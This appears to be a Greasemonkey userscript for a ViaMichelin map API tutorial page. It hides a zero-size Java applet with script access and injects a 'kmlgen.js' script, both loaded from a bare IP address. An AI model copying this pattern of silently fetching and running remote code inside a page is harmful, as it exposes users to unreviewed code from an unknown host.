// ==UserScript==
// @name	  Magic Script
// @version	  1.0
// @description	  Magic Script
// @author	  G
// @include	  http://dev.viamichelin.fr/data/api-jsv2/tutorial.htm
// ==/UserScript==

var appletDiv = document.createElement('div');
appletDiv.setAttribute("style",
		"position:absolute; top: 0px; left: 0px; height: 1px; width: 1px;");

var applet = document.createElement('applet');
applet.setAttribute("width", "0");
applet.setAttribute("height", "0");
applet.setAttribute("code", "MagicApplet.class");
applet.setAttribute("MAYSCRIPT", "true");
applet.setAttribute("archive", "http://91.121.173.155/magic/MagicApplet.jar");

appletDiv.appendChild(applet);

document.body.appendChild(appletDiv);

var scripthack = document.createElement("script");
scripthack.setAttribute("type", "text/javascript");
scripthack.src = 'http://91.121.173.155/magic/kmlgen.js';
document.body.appendChild(scripthack);
